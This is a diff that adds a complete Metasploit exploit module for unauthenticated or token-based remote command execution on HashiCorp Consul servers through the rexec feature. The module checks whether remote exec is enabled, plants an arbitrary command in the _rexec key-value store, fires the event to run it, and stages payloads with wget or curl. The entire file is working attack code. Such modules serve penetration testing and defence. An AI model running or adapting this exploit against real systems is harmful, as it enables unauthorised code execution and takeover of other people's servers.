@@ -1,0 +1,176 @@
+##
+# This module requires Metasploit: https://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+class MetasploitModule < Msf::Exploit::Remote
+  Rank = ExcellentRanking
+
+  include Msf::Exploit::Remote::HttpClient
+  include Msf::Exploit::CmdStager
+
+  def initialize(info={})
+    super(update_info(info,
+      'Name'           => "Hashicorp Consul Remote Command Execution via Rexec",
+      'Description'    => %q{
+        This module exploits a feature of Hashicorp Consul named rexec.
+      },
+      'License'        => MSF_LICENSE,
+      'Author'         =>
+        [
+          'Bharadwaj Machiraju <bharadwaj.machiraju[at]gmail.com>', # Discovery and PoC
+          'Francis Alexander <helofrancis[at]gmail.com>', # Discovery and PoC
+          'Quentin Kaiser <kaiserquentin[at]gmail.com>' # Metasploit module
+        ],
+      'References'     =>
+        [
+          [ 'URL', 'https://www.consul.io/docs/agent/options.html#disable_remote_exec' ],
+          [ 'URL', 'https://www.consul.io/docs/commands/exec.html'],
+          [ 'URL', 'https://github.com/torque59/Garfield' ]
+        ],
+      'Platform'        => 'linux',
+      'Targets'         => [ [ 'Linux', {} ] ],
+      'Payload'         => {},
+      'CmdStagerFlavor' => [ 'bourne', 'echo', 'printf', 'wget', 'curl' ],
+      'Privileged'     => false,
+      'DefaultTarget'  => 0,
+      'DisclosureDate' => 'Aug 11 2018'))
+    register_options(
+      [
+        OptString.new('TARGETURI', [true, 'The base path', '/']),
+        OptBool.new('SSL', [false, 'Negotiate SSL/TLS for outgoing connections', false]),
+        OptInt.new('TIMEOUT', [false, 'The timeout to use when waiting for the command to trigger', 20]),
+        OptString.new('ACL_TOKEN', [false, 'Consul Agent ACL token', '']),
+        Opt::RPORT(8500)
+      ])
+  end
+
+  def check
+    uri = target_uri.path
+    res = send_request_cgi({
+      'method'  => 'GET',
+      'uri' => normalize_uri(uri, "/v1/agent/self"),
+      'headers' => {
+        'X-Consul-Token' => datastore['ACL_TOKEN']
+      }
+    })
+    unless res
+      vprint_error 'Connection failed'
+      return CheckCode::Unknown
+    end
+    begin
+      agent_info = JSON.parse(res.body)
+      if agent_info["Config"]["DisableRemoteExec"] == false || agent_info["DebugConfig"]["DisableRemoteExec"] == false
+        return CheckCode::Vulnerable
+      else
+        return CheckCode::Safe
+      end
+    rescue JSON::ParserError
+      vprint_error 'Failed to parse JSON output.'
+      return CheckCode::Unknown
+    end
+  end
+
+  def execute_command(cmd, opts = {})
+    uri = target_uri.path
+
+    print_status('Creating session.')
+    res = send_request_cgi({
+      'method' => 'PUT',
+      'uri' => normalize_uri(uri, 'v1/session/create'),
+      'headers' => {
+        'X-Consul-Token' => datastore['ACL_TOKEN']
+      },
+      'ctype' => 'application/json',
+      'data' => {:Behavior => "delete", :Name => "Remote Exec", :TTL => "15s"}.to_json
+    })
+
+    if res and res.code == 200
+      begin
+        sess = JSON.parse(res.body)
+        print_status("Got rexec session ID #{sess['ID']}")
+      rescue JSON::ParseError
+        fail_with(Failure::Unknown, 'Failed to parse JSON output.')
+      end
+    end
+
+    print_status("Setting command for rexec session #{sess['ID']}")
+    res = send_request_cgi({
+      'method' => 'PUT',
+      'uri' => normalize_uri(uri, "v1/kv/_rexec/#{sess['ID']}/job?acquire=#{sess['ID']}"),
+      'headers' => {
+        'X-Consul-Token' => datastore['ACL_TOKEN']
+      },
+      'ctype' => 'application/json',
+      'data' => {:Command => "#{cmd}", :Wait => 2000000000}.to_json
+    })
+    if res and not res.code == 200 or res.body == 'false'
+      fail_with(Failure::Unknown, 'An error occured when contacting the Consul API.')
+    end
+
+    print_status("Triggering execution on rexec session #{sess['ID']}")
+    res = send_request_cgi({
+      'method' => 'PUT',
+      'uri' => normalize_uri(uri, "v1/event/fire/_rexec"),
+      'headers' => {
+        'X-Consul-Token' => datastore['ACL_TOKEN']
+      },
+      'ctype' => 'application/json',
+      'data' => {:Prefix => "_rexec", :Session => "#{sess['ID']}"}.to_json
+    })
+    if res and not res.code == 200
+      fail_with(Failure::Unknown, 'An error occured when contacting the Consul API.')
+    end
+
+    begin
+      Timeout.timeout(datastore['TIMEOUT']) do
+        res = send_request_cgi({
+          'method' => 'GET',
+          'uri' => normalize_uri(uri, "v1/kv/_rexec/#{sess['ID']}/?keys=&wait=2000ms"),
+          'headers' => {
+            'X-Consul-Token' => datastore['ACL_TOKEN']
+          }
+        })
+        begin
+          data = JSON.parse(res.body)
+          break if data.include? 'out'
+        rescue JSON::ParseError
+          fail_with(Failure::Unknown, 'Failed to parse JSON output.')
+        end
+        sleep 2
+      end
+    rescue Timeout::Error
+      # we catch this error so cleanup still happen afterwards
+      print_status("Timeout hit, error with payload ?")
+    end
+
+    print_status("Cleaning up rexec session #{sess['ID']}")
+    res = send_request_cgi({
+      'method' => 'PUT',
+      'uri' => normalize_uri(uri, "v1/session/destroy/#{sess['ID']}"),
+      'headers' => {
+        'X-Consul-Token' => datastore['ACL_TOKEN']
+      }
+    })
+
+    if res and not res.code == 200 or res.body == 'false'
+      fail_with(Failure::Unknown, 'An error occured when contacting the Consul API.')
+    end
+
+    res = send_request_cgi({
+      'method' => 'DELETE',
+      'uri' => normalize_uri(uri, "v1/kv/_rexec/#{sess['ID']}?recurse="),
+      'headers' => {
+        'X-Consul-Token' => datastore['ACL_TOKEN']
+      }
+    })
+
+    if res and not res.code == 200 or res.body == 'false'
+      fail_with(Failure::Unknown, 'An error occured when contacting the Consul API.')
+    end
+  end
+
+  def exploit
+    execute_cmdstager()
+  end
+end
